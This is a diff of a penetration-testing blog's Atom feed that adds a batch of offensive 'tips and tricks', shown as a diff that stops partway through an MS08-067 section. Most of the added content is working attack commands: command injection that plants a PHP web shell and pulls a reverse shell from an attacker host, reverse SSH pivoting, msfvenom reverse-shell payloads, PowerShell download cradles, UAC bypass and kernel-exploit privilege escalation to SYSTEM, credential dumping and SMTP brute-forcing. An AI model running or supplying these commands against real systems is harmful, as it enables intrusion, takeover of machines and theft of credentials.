@@ -5,7 +5,7 @@
 <link rel="self" type="application/atom+xml" href="https://jivoi.github.io/feed.xml" />
 <link rel="alternate" type="text/html" href="https://jivoi.github.io" />
 <icon>https://i.imgur.com/s7cqI3w.jpg</icon>
-<updated>2016-04-05T13:43:40+03:00</updated>
+<updated>2016-04-06T13:56:28+03:00</updated>
 <id>https://jivoi.github.io/</id>
 <author>
   <name>EK</name>
@@ -1891,6 +1891,25 @@ systemctl start iptables.service&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
   &lt;li&gt;&lt;a href=&quot;#exploit-servers-to-shellshock&quot; id=&quot;markdown-toc-exploit-servers-to-shellshock&quot;&gt;Exploit servers to Shellshock&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#root-with-docker&quot; id=&quot;markdown-toc-root-with-docker&quot;&gt;Root with Docker&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#tunneling-over-dns-to-bypass-firewall&quot; id=&quot;markdown-toc-tunneling-over-dns-to-bypass-firewall&quot;&gt;Tunneling Over DNS to Bypass Firewall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#compile-assemble-code&quot; id=&quot;markdown-toc-compile-assemble-code&quot;&gt;Compile Assemble code&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#pivoting-to-internal-network-via-non-interactive-shell&quot; id=&quot;markdown-toc-pivoting-to-internal-network-via-non-interactive-shell&quot;&gt;Pivoting to Internal Network Via Non Interactive Shell&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#patator-is-a-multi-purpose-brute-forcer&quot; id=&quot;markdown-toc-patator-is-a-multi-purpose-brute-forcer&quot;&gt;Patator is a multi-purpose brute-forcer&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#metasploit-web-terminal-via-gotty&quot; id=&quot;markdown-toc-metasploit-web-terminal-via-gotty&quot;&gt;Metasploit Web terminal via Gotty&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#get-full-shell-with-post-rce&quot; id=&quot;markdown-toc-get-full-shell-with-post-rce&quot;&gt;Get full shell with POST RCE&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exiftool---read-and-write-meta-information-in-files&quot; id=&quot;markdown-toc-exiftool---read-and-write-meta-information-in-files&quot;&gt;Exiftool - Read and write meta information in files&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#get-system-with-admin-reverseshell-on-win7&quot; id=&quot;markdown-toc-get-system-with-admin-reverseshell-on-win7&quot;&gt;Get SYSTEM with Admin reverse_shell on Win7&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#get-system-with-standard-user-reverseshell-on-win7&quot; id=&quot;markdown-toc-get-system-with-standard-user-reverseshell-on-win7&quot;&gt;Get SYSTEM with Standard user reverse_shell on Win7&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#generate-our-own-dic-file-based-on-the-website-content&quot; id=&quot;markdown-toc-generate-our-own-dic-file-based-on-the-website-content&quot;&gt;Generate our own dic file based on the website content&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#bruteforce-dns-records-using-nmap&quot; id=&quot;markdown-toc-bruteforce-dns-records-using-nmap&quot;&gt;Bruteforce DNS records using Nmap&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#identifying-a-waf-with-nmap&quot; id=&quot;markdown-toc-identifying-a-waf-with-nmap&quot;&gt;Identifying a WAF with Nmap&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#ms08-067---without-the-use-of-metasploit&quot; id=&quot;markdown-toc-ms08-067---without-the-use-of-metasploit&quot;&gt;MS08-067 - without the use of Metasploit&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nikto-scan-with-squid-proxy&quot; id=&quot;markdown-toc-nikto-scan-with-squid-proxy&quot;&gt;Nikto scan with SQUID proxy&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#hijack-a-binarys-full-path-in-bash-to-exec-your-own-code&quot; id=&quot;markdown-toc-hijack-a-binarys-full-path-in-bash-to-exec-your-own-code&quot;&gt;Hijack a binary’s full path in bash to exec your own code&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation-through-mysql-run-with-root-privileges&quot; id=&quot;markdown-toc-local-privilege-escalation-through-mysql-run-with-root-privileges&quot;&gt;Local privilege escalation through MySQL run with root privileges&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#bruteforce-ssh-login-with-patator&quot; id=&quot;markdown-toc-bruteforce-ssh-login-with-patator&quot;&gt;Bruteforce SSH login with patator&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#using-ldpreload-to-inject-features-to-programs&quot; id=&quot;markdown-toc-using-ldpreload-to-inject-features-to-programs&quot;&gt;Using LD_PRELOAD to inject features to programs&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploit-the-openssh-user-enumeration-timing-attack&quot; id=&quot;markdown-toc-exploit-the-openssh-user-enumeration-timing-attack&quot;&gt;Exploit the OpenSSH User Enumeration Timing Attack&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#create-a-tcp-circuit-through-validly-formed-http-requests-with-reduh&quot; id=&quot;markdown-toc-create-a-tcp-circuit-through-validly-formed-http-requests-with-reduh&quot;&gt;Create a TCP circuit through validly formed HTTP requests with ReDuh&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
   &lt;/div&gt;
@@ -1900,6 +1919,7 @@ systemctl start iptables.service&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id=&quot;other-parts&quot;&gt;Other Parts&lt;/h3&gt;
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/&quot;&gt;Part 1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/&quot;&gt;Part 2&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h3 id=&quot;tor-nat-traversal&quot;&gt;Tor Nat Traversal&lt;/h3&gt;
@@ -2061,6 +2081,239 @@ dnscat2&amp;gt; session -i 16059
 &lt;span class=&quot;c&quot;&gt;# https://downloads.skullsecurity.org/dnscat2/&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# https://github.com/lukebaggett/dnscat2-powershell&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dnscat --host &amp;lt;dnscat server_ip&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;compile-assemble-code&quot;&gt;Compile Assemble code&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm -f elf32 simple32.asm -o simple32.o
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld -m elf_i386 simple32.o simple32
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm -f elf64 simple.asm -o simple.o
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld simple.o -o simple&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;pivoting-to-internal-network-via-non-interactive-shell&quot;&gt;Pivoting to Internal Network Via Non Interactive Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# generate ssh key with shell&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -O - -q &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://domain.tk/sh.php?cmd=whoami&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -O - -q &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&amp;quot;\&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -O - -q &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&amp;quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# add tempuser at attacker ps&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;useradd -m tempuser
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkdir /home/tempuser/.ssh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod &lt;span class=&quot;m&quot;&gt;700&lt;/span&gt; /home/tempuser/.ssh
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -O - -q &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&amp;quot;&lt;/span&gt; &amp;gt; /home/tempuser/.ssh/authorized_keys
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod &lt;span class=&quot;m&quot;&gt;700&lt;/span&gt; /home/tempuser/.ssh/authorized_keys
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chown -R tempuser:tempuser /home/tempuser/.ssh
+
+&lt;span class=&quot;c&quot;&gt;# create reverse ssh shell&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -O - -q &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&amp;lt;attacker_ip&amp;gt;&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;patator-is-a-multi-purpose-brute-forcer&quot;&gt;Patator is a multi-purpose brute-forcer&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# git clone https://github.com/lanjelot/patator.git /usr/share/patator&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# SMTP bruteforce&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;patator smtp_login &lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.17.129 &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Ololena &lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE0 &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/john/password.lst
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;patator smtp_login &lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.17.129 &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE1 &lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE0 &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/john/password.lst &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/john/usernames.lst
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;patator smtp_login &lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.17.129 &lt;span class=&quot;nv&quot;&gt;helo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;ehlo 192.168.17.128&amp;#39;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE1 &lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE0 &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/john/password.lst &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/john/usernames.lst
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;patator smtp_login &lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.17.129 &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Ololena &lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE0 &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/john/password.lst -x ignore:fgrep&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;incorrect password or account name&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;metasploit-web-terminal-via-gotty&quot;&gt;Metasploit Web terminal via Gotty&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;service postgresql start
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfdb init
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-get install golang
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkdir /root/gocode
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;GOPATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/root/gocode
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;go get github.com/yudai/gotty
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gocode/bin/gotty -a 127.0.0.1 -w msfconsole
+&lt;span class=&quot;c&quot;&gt;# open in browser http://127.0.0.1:8080&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;get-full-shell-with-post-rce&quot;&gt;Get full shell with POST RCE&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;attacker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl -i -s -k  -X &lt;span class=&quot;s1&quot;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt; --data-binary &lt;span class=&quot;s1&quot;&gt;$&amp;#39;IP=%3Bwhoami&amp;amp;submit=submit&amp;#39;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;http://victum.tk/command.php&amp;#39;&lt;/span&gt;
+
+attacker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl -i -s -k  -X &lt;span class=&quot;s1&quot;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt; --data-binary &lt;span class=&quot;s1&quot;&gt;$&amp;#39;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;amp;submit=submit&amp;#39;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;http://victum.tk/command.php&amp;#39;&lt;/span&gt;
+
+attacker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://victum.tk/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id
+
+&lt;span class=&quot;c&quot;&gt;# download reverse shell to server (phpshell.php)&lt;/span&gt;
+http://victum.tk/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;%27
+
+&lt;span class=&quot;c&quot;&gt;# run nc and execute phpshell.php&lt;/span&gt;
+attacker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc -nvlp 1337&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exiftool---read-and-write-meta-information-in-files&quot;&gt;Exiftool - Read and write meta information in files&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-10.13.tar.gz
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tar xzf Image-ExifTool-10.13.tar.gz
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Image-ExifTool-10.13
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl Makefile.PL
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exiftool main.gif&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;get-system-with-admin-reverseshell-on-win7&quot;&gt;Get SYSTEM with Admin reverse_shell on Win7&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom –p windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.102 –f exe &amp;gt; danger.exe
+
+&lt;span class=&quot;c&quot;&gt;#show account settings&lt;/span&gt;
+net user &amp;lt;login&amp;gt;
+
+&lt;span class=&quot;c&quot;&gt;# download psexec to kali&lt;/span&gt;
+https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
+
+&lt;span class=&quot;c&quot;&gt;# upload psexec.exe file onto the victim machine with powershell script&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Net.WebClient &amp;gt; script.ps1
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$targetlocation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://192.168.56.102/PsExec.exe&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; script.ps1
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$targetlocation&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&amp;quot;psexec.exe&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt;&amp;gt; script.ps1
+powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1
+
+&lt;span class=&quot;c&quot;&gt;# upload danger.exe file onto the victim machine with powershell script&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Net.WebClient &amp;gt; script2.ps1
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$targetlocation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://192.168.56.102/danger.exe&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; script2.ps1
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$targetlocation&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&amp;quot;danger.exe&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt;&amp;gt; script2.ps1
+powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1
+
+&lt;span class=&quot;c&quot;&gt;# UAC bypass from precompiled binaries:&lt;/span&gt;
+https://github.com/hfiref0x/UACME
+
+&lt;span class=&quot;c&quot;&gt;# upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershell&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Net.WebClient &amp;gt; script2.ps1
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$targetlocation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://192.168.56.102/Akagi64.exe&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; script3.ps1
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$targetlocation&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&amp;quot;Akagi64.exe&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt;&amp;gt; script3.ps1
+powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1
+
+&lt;span class=&quot;c&quot;&gt;# create listener on kali&lt;/span&gt;
+nc -lvp 4444
+
+&lt;span class=&quot;c&quot;&gt;# Use Akagi64 to run the danger.exe file with SYSTEM privileges&lt;/span&gt;
+Akagi64.exe &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;ser&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;anger.exe
+
+&lt;span class=&quot;c&quot;&gt;# create listener on kali&lt;/span&gt;
+nc -lvp 4444
+
+&lt;span class=&quot;c&quot;&gt;# The above step should give us a reverse shell with elevated privileges&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Use PsExec to run the danger.exe file with SYSTEM privileges&lt;/span&gt;
+psexec.exe –i –d –accepteula –s danger.exe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;get-system-with-standard-user-reverseshell-on-win7&quot;&gt;Get SYSTEM with Standard user reverse_shell on Win7&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx &lt;span class=&quot;c&quot;&gt;#ms15-051&lt;/span&gt;
+https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
+https://www.exploit-db.com/exploits/37049/
+
+&lt;span class=&quot;c&quot;&gt;# check the list of patches applied on the target machine&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# to get the list of Hotfixes installed, type in the following command.&lt;/span&gt;
+wmic qfe get
+wmic qfe &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; find &lt;span class=&quot;s2&quot;&gt;&amp;quot;3057191&amp;quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Upload compile exploit to victim machine and run it&lt;/span&gt;
+https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe
+
+&lt;span class=&quot;c&quot;&gt;# by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file &amp;quot;main.c&amp;quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# dump clear text password of the currently logged in user using wce.exe&lt;/span&gt;
+http://www.ampliasecurity.com/research/windows-credentials-editor/
+wce -w
+
+&lt;span class=&quot;c&quot;&gt;# dump hashes of other users with pwdump7&lt;/span&gt;
+http://www.heise.de/download/pwdump.html
+&lt;span class=&quot;c&quot;&gt;# we can try online hash cracking tools such crackstation.net&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;generate-our-own-dic-file-based-on-the-website-content&quot;&gt;Generate our own dic file based on the website content&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cewl -m &lt;span class=&quot;m&quot;&gt;4&lt;/span&gt; -w dict.txt http://site.url
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john --wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dict.txt --rules --stdout&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;bruteforce-dns-records-using-nmap&quot;&gt;Bruteforce DNS records using Nmap&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap --script dns-brute --script-args dns-brute.domain&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;foo.com,dns-brute.threads&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6,dns-brute.hostlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./hostfile.txt,newtargets -sS -p 80
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap --script dns-brute www.foo.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;identifying-a-waf-with-nmap&quot;&gt;Identifying a WAF with Nmap&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -p 80,443 --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-waf-detect 192.168.56.102
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -p 80,443 --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-waf-fingerprint 192.168.56.102
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wafw00f www.example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ms08-067---without-the-use-of-metasploit&quot;&gt;MS08-067 - without the use of Metasploit&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -v -p 139, &lt;span class=&quot;m&quot;&gt;445&lt;/span&gt; --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;smb-check-vulns --script-args&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;unsafe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 192.168.31.205
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit ms08-067
